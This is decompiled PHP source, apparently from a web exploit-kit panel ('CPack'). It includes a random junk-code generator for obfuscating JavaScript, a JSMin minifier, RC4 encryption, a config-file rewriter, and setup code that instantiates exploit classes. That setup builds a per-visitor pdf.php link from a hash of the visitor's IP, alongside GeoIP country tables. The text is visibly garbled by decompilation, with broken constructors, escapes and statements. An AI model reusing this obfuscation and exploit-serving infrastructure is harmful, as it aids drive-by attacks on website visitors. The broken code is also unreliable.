						$code .= 'var ' . $CPJunkCode[5] . ' = ' . mt_rand( 1, 999 ) . ';var ' . $CPJunkCode[6] . ' = ' . mt_rand( 1, 999 ) . ';var ' . $CPJunkCode[7] . ' = ' . $CPJunkCode[5] . '*' . $CPJunkCode[6] . '-' . $CPJunkCode[5] . ';';
					}


					if (mt_rand( 1, 20 ) <= 10) {
						$code .= '
';
						$code .= 'var ' . $CPJunkCode[8] . ' = "' . $CPJunkCode[9] . '";var ' . $CPJunkCode[10] . ' = decodeURIComponent(' . $CPJunkCode[8] . ');';
					}


					if (mt_rand( 1, 15 ) <= 10) {
						$code .= '
';
						$code .= 'var ' . $CPJunkCode[11] . ' = parseFloat("' . $CPJunkCode[12] . '");';
					}
				}

				return $code;
			}
		}

		class JSMin {
			private $a = '';
			private $b = '';
			private $input = '';
			private $inputIndex = 0;
			private $inputLength = 0;
			private $lookAhead = null;
			private $output = '';

			function minify($js) {
				JSMin;
				$jsmin = new ( $js );
				return $jsmin->min(  );
			}

			function __construct($input) {
				$this->input = str_replace( '
', '
', $input );
				$this->inputLength = strlen( $this->input );
			}

			function action($d) {
				switch ($d) {
				case 1: {
						$this->output .= $this->a;
					}

				case 2: {
						$this->a = $this->b;

						if (( $this->a === '\'' || $this->a === '"' )) {
							while (true) {
								$this->output .= $this->a;
								$this->a = $this->get(  );

								if ($this->a === $this->b) {
									break;
								}


								if (ord( $this->a ) <= ORD_LF) {
									JSMinException;
									throw new ( 'Unterminated string literal.' );
								}


								if ($this->a === '\') {
								$this->output .= $this->a;
								$this->a = $this->get(  );
								continue;
							}
						}
					}
				}

				case 3: {
					$this->b = $this->next(  );

					if (( $this->b === '/' && ( ( ( ( ( ( ( ( $this->a === '(' || $this->a === ',' ) || $this->a === '=' ) || $this->a === ':' ) || $this->a === '[' ) || $this->a === '!' ) || $this->a === '&' ) || $this->a === '|' ) || $this->a === '?' ) )) {
						$this->output .= $this->a . $this->b;

						while (true) {
							$this->a = $this->get(  );

							if ($this->a === '/') {
								break;
							}


							if ($this->a === '\') {
								$this->output .= $this->a;
								$this->a = $this->get(  );
							}
else {
								if (ord( $this->a ) <= ORD_LF) {
									JSMinException;
									throw new ( 'Unterminated regular expression literal.' );
								}
							}

							$this->output .= $this->a;
						}

						$this->b = $this->next(  );
					}
				}
			}

		}

		function get() {
			$c = $this->lookAhead;
			$this->lookAhead = null;

			if ($c === null) {
				if ($this->inputIndex < $this->inputLength) {
					$c = $this->input[$this->inputIndex];
					 += 'inputIndex';
					 = 1;
				}
else {
					$c = null;
				}
			}


			if ($c === '
										') {
				return '
										';
			}


			if (( ( $c === null || $c === '
										' ) || ORD_SPACE <= ord( $c ) )) {
				return $c;
			}

			return ' ';
		}

		function isAlphaNum($c) {
			return ( ( 126 < ord( $c ) || $c === '\' ) || preg_match( '/^[\w\$]$/', $c ) === 1 );
		}

		function min() {
			$this->a = '
										';
			$this->action( 3 );

			while ($this->a !== null) {
				switch ($this->a) {
					case ' ': {
						if ($this->isAlphaNum( $this->b )) {
							$this->action( 1 );
						}
else {
							$this->action( 2 );
						}

						break;
					}

					case '
										': {
						switch ($this->b) {
							case '{': {
							}

							case '[': {
							}

							case '(': {
							}

							case '+': {
							}

							case '-': {
								$this->action( 1 );
								break;
							}

							case ' ': {
								$this->action( 3 );
								break;
							}

							default: {
								if ($this->isAlphaNum( $this->b )) {
									$this->action( 1 );
									break;
								}
else {
									$this->action( 2 );
								}
							}
						}

						break;
					}

					default: {
						switch ($this->b) {
							case ' ': {
								if ($this->isAlphaNum( $this->a )) {
									$this->action( 1 );
									break;
								}

								$this->action( 3 );
								break;
							}

							case '
												': {
								switch ($this->a) {
									case '}': {
									}

									case ']': {
									}

									case ')': {
									}

									case '+': {
									}

									case '-': {
									}

									case '"': {
									}

									case '\'': {
										$this->action( 1 );
										break;
									}

									default: {
										if ($this->isAlphaNum( $this->a )) {
											$this->action( 1 );
											break;
										}
else {
											$this->action( 3 );
										}
									}
								}

								break;
							}

							default: {
								$this->action( 1 );
								break;
							}
						}
					}
				}
			}

			return $this->output;
		}

		function next() {
			$c = $this->get(  );

			if ($c === '/') {
				switch ($this->peek(  )) {
					case '/': {
						while (true) {
							$c = $this->get(  );

							if (ord( $c ) <= ORD_LF) {
								return $c;
								continue;
							}
						}
					}

					case '*': {
						$this->get(  );

						while (true) {
							switch ($this->get(  )) {
								case '*': {
									if ($this->peek(  ) === '/') {
										$this->get(  );
										return ' ';
									}

									break;
								}

								case null: {
									JSMinException;
									throw new ( 'Unterminated comment.' );
								}
							}
						}
					}

					default: {
						$c;
					}
				}

				return ;
			}

			return $c;
		}

		function peek() {
			$this->lookAhead = $this->get(  );
			return $this->lookAhead;
		}
	}

	class JSMinException extends Exception {
	}

	class RC4 {
		function swap(&$v1, $v2) {
			$v1 = $v1 ^ $v2;
			$v2 = $v1 ^ $v2;
			$v1 = $v1 ^ $v2;
		}

		function KSA($key) {
			$idx = crc32( $key );
			self;

			if (!isset( $S[$idx] )) {
				$S = range( 0, 255 );
				$j = 0;
				$n = strlen( $key );
				$i = 0;

				while ($i < 255) {
					$char = ord( $key[$i % $n] );
					$j = ( $j + $S[$i] + $char ) % 256;
					self::swap( $S[$i], $S[$j] );
					++$i;
				}

				self;
				$S[$idx] = $S;
			}

			self;
			return $S[$idx];
		}

		function encrypt($key, $data) {
			$S = self::ksa( $key );
			$n = strlen( $data );
			$i = $j = 0;
			$data = str_split( $data, 1 );
			$m = 0;

			while ($m < $n) {
				$i = ( $i + 1 ) % 256;
				$j = ( $j + $S[$i] ) % 256;
				self::swap( $S[$i], $S[$j] );
				$char = ord( $data[$m] );
				$char = $S[( $S[$i] + $S[$j] ) % 256] ^ $char;
				$data[$m] = chr( $char );
				++$m;
			}

			$data = implode( '', $data );
			return $data;
		}

		function decrypt($key, $data) {
			return self::encrypt( $key, $data );
		}
	}

	function updateDefined($bicjhfegeh, $cgfhfdafhe, $efdaejhif) {
		$fejjabice = 'config.inc.php';

		if (( !file_exists( $fejjabice ) || filesize( $fejjabice ) < 1 )) {
			return false;
		}

		$djhijidigb = file_get_contents( $fejjabice );
		$djhijidigb = str_replace( 'define(\'' . $bicjhfegeh . '\',\'' . $cgfhfdafhe . '\');', 'define(\'' . $bicjhfegeh . '\',\'' . $efdaejhif . '\');', $djhijidigb );
		$dhhejeedad = fopen( $fejjabice, 'w' );
		fwrite( $dhhejeedad, $djhijidigb );
		fclose( $dhhejeedad );
		return true;
	}

	function StrToHexStr($cfchihbiej, $cdghbeafjd) {
		$bjbbdgbece = '';
		$ebjcjeejg = 0;

		while ($ebjcjeejg < strlen( $cfchihbiej )) {
			$bjbbdgbece .= $cdghbeafjd . dechex( ord( $cfchihbiej[$ebjcjeejg] ) );
			++$ebjcjeejg;
		}

		return $bjbbdgbece;
	}

	CPFunctions;
	$cpFunctions = new (  );
	CPackExploitHelper;
	$cpXplHelper = new (  );
	CPackExploits;
	$cpExploits = new (  );
	CPackMySQL;
	$cpMySQL = new (  );
	$iphash = strtoupper( md5( $cpFunctions->GetIP(  ) ) );
	$url = $cpXplHelper->GetNormalURL(  );
	$pdf = $url . '/pdf.php?pdf=' . $iphash;
	$GlobalKey = 'oAubAIpaAOUBiwUAYvTA';
	$GEOIP_COUNTRY_CODE_TO_NUMBER = array( 'Unknown' => 0, 'AP' => 1, 'EU' => 2, 'AD' => 3, 'AE' => 4, 'AF' => 5, 'AG' => 6, 'AI' => 7, 'AL' => 8, 'AM' => 9, 'AN' => 10, 'AO' => 11, 'AQ' => 12, 'AR' => 13, 'AS' => 14, 'AT' => 15, 'AU' => 16, 'AW' => 17, 'AZ' => 18, 'BA' => 19, 'BB' => 20, 'BD' => 21, 'BE' => 22, 'BF' => 23, 'BG' => 24, 'BH' => 25, 'BI' => 26, 'BJ' => 27, 'BM' => 28, 'BN' => 29, 'BO' => 30, 'BR' => 31, 'BS' => 32, 'BT' => 33, 'BV' => 34, 'BW' => 35, 'BY' => 36, 'BZ' => 37, 'CA' => 38, 'CC' => 39, 'CD' => 40, 'CF' => 41, 'CG' => 42, 'CH' => 43, 'CI' => 44, 'CK' => 45, 'CL' => 46, 'CM' => 47, 'CN' => 48, 'CO' => 49, 'CR' => 50, 'CU' => 51, 'CV' => 52, 'CX' => 53, 'CY' => 54, 'CZ' => 55, 'DE' => 56, 'DJ' => 57, 'DK' => 58, 'DM' => 59, 'DO' => 60, 'DZ' => 61, 'EC' => 62, 'EE' => 63, 'EG' => 64, 'EH' => 65, 'ER' => 66, 'ES' => 67, 'ET' => 68, 'FI' => 69, 'FJ' => 70, 'FK' => 71, 'FM' => 72, 'FO' => 73, 'FR' => 74, 'FX' => 75, 'GA' => 76, 'GB' => 77, 'GD' => 78, 'GE' => 79, 'GF' => 80, 'GH' => 81, 'GI' => 82, 'GL' => 83, 'GM' => 84, 'GN' => 85, 'GP' => 86, 'GQ' => 87, 'GR' => 88, 'GS' => 89, 'GT' => 90, 'GU' => 91, 'GW' => 92, 'GY' => 93, 'HK' => 94, 'HM' => 95, 'HN' => 96, 'HR' => 97, 'HT' => 98, 'HU' => 99, 'ID' => 100, 'IE' => 101, 'IL' => 102, 'IN' => 103, 'IO' => 104, 'IQ' => 105, 'IR' => 106, 'IS' => 107, 'IT' => 108, 'JM' => 109, 'JO' => 110, 'JP' => 111, 'KE' => 112, 'KG' => 113, 'KH' => 114, 'KI' => 115, 'KM' => 116, 'KN' => 117, 'KP' => 118, 'KR' => 119, 'KW' => 120, 'KY' => 121, 'KZ' => 122, 'LA' => 123, 'LB' => 124, 'LC' => 125, 'LI' => 126, 'LK' => 127, 'LR' => 128, 'LS' => 129, 'LT' => 130, 'LU' => 131, 'LV' => 132, 'LY' => 133, 'MA' => 134, 'MC' => 135, 'MD' => 136, 'MG' => 137, 'MH' => 138, 'MK' => 139, 'ML' => 140, 'MM' => 141, 'MN' => 142, 'MO' => 143, 'MP' => 144, 'MQ' => 145, 'MR' => 146, 'MS' => 147, 'MT' => 148, 'MU' => 149, 'MV' => 150, 'MW' => 151, 'MX' => 152, 'MY' => 153, 'MZ' => 154, 'NA' => 155, 'NC' => 156, 'NE' => 157, 'NF' => 158, 'NG' => 159, 'NI' => 160, 'NL' => 161, 'NO' => 162, 'NP' => 163, 'NR' => 164, 'NU' => 165, 'NZ' => 166, 'OM' => 167, 'PA' => 168, 'PE' => 169, 'PF' => 170, 'PG' => 171, 'PH' => 172, 'PK' => 173, 'PL' => 174, 'PM' => 175, 'PN' => 176, 'PR' => 177, 'PS' => 178, 'PT' => 179, 'PW' => 180, 'PY' => 181, 'QA' => 182, 'RE' => 183, 'RO' => 184, 'RU' => 185, 'RW' => 186, 'SA' => 187, 'SB' => 188, 'SC' => 189, 'SD' => 190, 'SE' => 191, 'SG' => 192, 'SH' => 193, 'SI' => 194, 'SJ' => 195, 'SK' => 196, 'SL' => 197, 'SM' => 198, 'SN' => 199, 'SO' => 200, 'SR' => 201, 'ST' => 202, 'SV' => 203, 'SY' => 204, 'SZ' => 205, 'TC' => 206, 'TD' => 207, 'TF' => 208, 'TG' => 209, 'TH' => 210, 'TJ' => 211, 'TK' => 212, 'TM' => 213, 'TN' => 214, 'TO' => 215, 'TP' => 216, 'TR' => 217, 'TT' => 218, 'TV' => 219, 'TW' => 220, 'TZ' => 221, 'UA' => 222, 'UG' => 223, 'UM' => 224, 'US' => 225, 'UY' => 226, 'UZ' => 227, 'VA' => 228, 'VC' => 229, 'VE' => 230, 'VG' => 231, 'VI' => 232, 'VN' => 233, 'VU' => 234, 'WF' => 235, 'WS' => 236, 'YE' => 237, 'YT' => 238, 'YU' => 239, 'ZA' => 240, 'ZM' => 241, 'ZR' => 242, 'ZW' => 243, 'A1' => 244, 'A2' => 245, 'O1' => 246 );
	$GEOIP_COUNTRY_CODES = array_keys( $GEOIP_COUNTRY_CODE_TO_NUMBER );
	$GEOIP_COUNTRY_NAMES = array( 'Unknown', 'Asia', 'Europe', 'Andorra', 'United Arab Emirates', 'Afghanistan', 'Antigua and Barbuda', 'Anguilla', 'Albania', 'Armenia', 'Netherlands Antilles', 'Angola', 'Antarctica', 'Argentina', 'American Samoa', 'Austria', 'Australia', 'Aruba', 'Azerbaijan', 'Bosnia and Herzegovina', 'Barbados', 'Bangladesh', 'Belgium', 'Burkina Faso', 'Bulgaria', 'Bahrain', 'Burundi', 'Benin', 'Bermuda', 'Brunei Darussalam', 'Bolivia', 'Brazil', 'Bahamas', 'Bhutan', 'Bouvet Island', 'Botswana', 'Belarus', 'Belize', 'Canada', 'Cocos Islands', 'Congo', 'Central African Republic', 'Congo', 'Switzerland', 'Cote D\'Ivoire', 'CookIslands', 'Chile', 'Cameroon', 'China', 'Colombia', 'Costa Rica', 'Cuba', 'CapeVerde', 'Christmas Island', 'Cyprus', 'Czech Republic', 'Germany', 'Djibouti', 'Denmark', 'Dominica', 'Dominican Republic', 'Algeria', 'Ecuador', 'Estonia', 'Egypt', 'Western Sahara', 'Eritrea', 'Spain', 'Ethiopia', 'Finland', 'Fiji', 'Falkland Islands', 'Micronesia', 'FaroeIslands', 'France', 'France', 'Gabon', 'United Kingdom', 'Grenada', 'Georgia', 'French Guiana', 'Ghana', 'Gibraltar', 'Greenland', 'Gambia', 'Guinea', 'Guadeloupe', 'Equatorial Guinea', 'Greece', 'South Sandwich Islands', 'Guatemala', 'Guam', 'Guinea-Bissau', 'Guyana', 'Hong Kong', 'Heard Island', 'Honduras', 'Croatia', 'Haiti', 'Hungary', 'Indonesia', 'Ireland', 'Israel', 'India', 'India', 'Iraq', 'Iran', 'Iceland', 'Italy', 'Jamaica', 'Jordan', 'Japan', 'Kenya', 'Kyrgyzstan', 'Cambodia', 'Kiribati', 'Comoros', 'Saint Kitts and Nevis', 'Korea', 'Korea', 'Kuwait', 'Cayman Islands', 'Kazakstan', 'Lao', 'Lebanon', 'Saint Lucia', 'Liechtenstein', 'Sri Lanka', 'Liberia', 'Lesotho', 'Lithuania', 'Luxembourg', 'Latvia', 'Libyan Arab Jamahiriya', 'Morocco', 'Monaco', 'Moldova', 'Madagascar', 'Marshall Islands', 'Macedonia', 'Mali', 'Myanmar', 'Mongolia', 'Macau', 'Northern Mariana Islands', 'Martinique', 'Mauritania', 'Montserrat', 'Malta', 'Mauritius', 'Maldives', 'Malawi', 'Mexico', 'Malaysia', 'Mozambique', 'Namibia', 'New Caledonia', 'Niger', 'Norfolk Island', 'Nigeria', 'Nicaragua', 'Netherlands', 'Norway', 'Nepal', 'Nauru', 'Niue', 'New Zealand', 'Oman', 'Panama', 'Peru', 'FrenchPolynesia', 'Papua New Guinea', 'Philippines', 'Pakistan', 'Poland', 'SaintPierre and Miquelon', 'Pitcairn', 'Puerto Rico', 'Palestinian Territory', 'Portugal', 'Palau', 'Paraguay', 'Qatar', 'Reunion', 'Romania', 'Russian Federation', 'Rwanda', 'Saudi Arabia', 'Solomon Islands', 'Seychelles', 'Sudan', 'Sweden', 'Singapore', 'Saint Helena', 'Slovenia', 'Svalbard and Jan Mayen', 'Slovakia', 'Sierra Leone', 'San Marino', 'Senegal', 'Somalia', 'Suriname', 'Sao Tome and Principe', 'El Salvador', 'Syrian ArabRepublic', 'Swaziland', 'Turks and Caicos Islands', 'Chad', 'French SouthernTerritories', 'Togo', 'Thailand', 'Tajikistan', 'Tokelau', 'Turkmenistan', 'Tunisia', 'Tonga', 'East Timor', 'Turkey', 'Trinidad and Tobago', 'Tuvalu', 'Taiwan', 'Tanzania, United Republic of', 'Ukraine', 'Uganda', 'United States', 'United States', 'Uruguay', 'Uzbekistan', 'Holy See', 'Saint Vincent', 'Venezuela', 'Virgin Islands', 'Virgin Islands', 'Vietnam', 'Vanuatu', 'Wallis and Futuna', 'Samoa', 'Yemen', 'Mayotte', 'Yugoslavia', 'South Africa', 'Zambia', 'Zaire', 'Zimbabwe', 'Anonymous Proxy', 'Satellite Provider', 'Other' );
	Exception;
?>
